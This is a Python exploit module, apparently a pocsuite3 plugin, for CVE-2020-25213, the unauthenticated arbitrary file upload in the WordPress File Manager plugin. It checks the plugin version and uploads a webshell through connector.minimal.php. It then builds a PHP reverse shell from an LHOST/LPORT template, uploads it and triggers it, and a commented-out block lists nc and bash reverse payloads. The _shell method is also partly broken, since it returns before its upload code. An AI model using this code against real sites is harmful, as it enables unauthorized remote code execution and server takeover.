"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse

from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
from configvalue import *
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc


class DemoPOC(POCBase):
    vulID = 'CVE-2020-25213'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '13/03/2020'
    createDate = '2020-11-15'
    updateDate = '2020-11-15'
    references = ['https://wpscan.com/vulnerability/10389']
    name = 'WordPress - File Manager < 6.9 - Unauthenticated Arbitrary File Upload leading to RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PHP],
                "folder_init": "cve_2020_25213"}
    appName = 'wordpress-cve-2020-25213'
    appVersion = 'CVE-2020-25213'
    vulType = VUL_TYPE.UPLOAD_FILES
    desc = '''File lib/php/connector.minimal.php can be default opened directly, and this file load lib/php/elFinderConnector.class.php which read POST/GET variables, and then allow executing some internal feature, like uploading file. PHP is allowed, thus this lead to unauthenticated arbitrary file upload and remote code execution. '''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 9.5 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''
    url_result = {}
    # def _options(self):
    #     o = OrderedDict()
    #     payload = {
    #         "nc": REVERSE_PAYLOAD.NC,
    #         "bash": REVERSE_PAYLOAD.BASH,
    #     }
    #     o["command"] = OptDict(selected="bash", default=payload)
    #     return o

    def check_version(self, url):
        try: 
            resp = requests.get(url + '/wp-content/plugins/wp-file-manager/readme.txt')
            if resp.status_code != 200:
                return False
            fixed_version = 6.9
            items = re.findall("Stable tag.*$", resp.text, re.MULTILINE)
            for x in items: 
                if(float)(x.split(": ")[1]) < fixed_version: 
                    return [True, (float)(x.split(": ")[1])]
                else: 
                    return [False, False] 
        except: 
            return False
                
       

    def _verify(self, update=True):
        if update: 
            config_input,  self.headers['Referer'] = decode_data_input_poc(self.headers['Referer'])
            try: 
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e: 
                raise Exception("Error " + self.appName + " :" + str(e))
        result = {}
        self.result_url = []
        for url in self.url: 
            flag = "\{\"error\":\[\"errUnknownCmd\"\]\}"
            r = requests.get(url +'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
            check, version  = self.check_version(url)
            try: 
                if check: 
                    if re.search(flag, r.text): 
                        self.result_url.append(url)
                        self.version = version
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['url'] = self.url + 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
            except Exception as e: 
                logger.warn(str(e))
        if len(self.result_url) > 0 : 
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.result_url
            result['VerifyInfo']['version'] = self.version
        if update: 
            return self.parse_output(result)
        else: 
            return result
       

    def _attack(self):
        config_input, self.headers['Referer'] = decode_data_input_poc(self.headers['Referer'])
        try: 
            self.url = config_input["Input"]['RECON_WEBAPP']
        except Exception as e: 
            raise Exception("Error " + self.appName + " :" + str(e) )

        result = {}
        vul_url = []
        for url in self.result_url: 
            [check, version] = self.check_version(url)
            filename = os.path.join(paths.POCSUITE_ROOT_PATH, "init_pocs/cve_2020_25213/simple_webshell.php")
            if check: 
                data = {
                    'cmd': 'upload', 
                    'target': 'l1_', 
                    'debug': 1
                }
                files = {
                    'upload[0]': open(filename, 'rb')
                }

                vulurl = url +  "wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
                requests.post(vulurl, data=data, files=files, verify=False) 
                r = requests.get( url + 'wp-content/plugins/wp-file-manager/lib/files/simple_webshell.php')
                if r.status_code == 200 and "shell is available" in r.text: 
                    vul_url.append(url)
        if len(vul_url) > 0: 
            result['ShellInfo'] = {}
            result['ShellInfo']['url'] =  vul_url[0]  + "wp-content/plugins/wp-file-manager/lib/files/simple_webshell.php"
            result['ShellInfo']['info'] = '''wordpress file manager plugin RCE ''' 
            return self.parse_output(result)
        return self.parse_output(False)

    def _shell(self):
        result = {}
        result["ShellInfo"] = {
            "Status": 'Success'
        }
        try: 
            config_input, self.headers['Referer'] = decode_data_input_poc

        except Exception as e: 
            if type(e) == requests.exceptions.ReadTimeout: 
                return self.parse_output(result)
            print("Error run shell ", self.name, e)
            pass
        return self.parse_output(False)
        datainput = self.headers['Referer']['input']
        self.headers['Referer'] = ''
        #-- 
        self.url =  datainput['entrypoint']
        filename_source = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_25213/php-reverse-shell-source.php')
        with open(filename_source, "rb") as file:
            shell  = file.read().decode()
            file.close()
        shell = shell.replace('LHOST_cve_2020_25213', datainput['LHOST'])
        shell = shell.replace('LPORT_cve_2020_25213', str(datainput['LPORT']))
        filename = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2020_25213/php-reverse-shell.php')
        with open(filename, "wb") as file:
            file.write( str.encode(shell))
            file.close()
        result = {}
        data = {
                'cmd': 'upload', 
                'target': 'l1_', 
                'debug': 1
        }
        files = {
                'upload[0]': open(filename,'rb')
                
        }
        
        vulnurl = self.url  + "wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        requests.post(vulnurl, data=data, files=files, verify=False) 
        print("upload shell thanh cong ")
        requests.get(self.url  + "wp-content/plugins/wp-file-manager/lib/files/php-reverse-shell.php")
                 
   

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
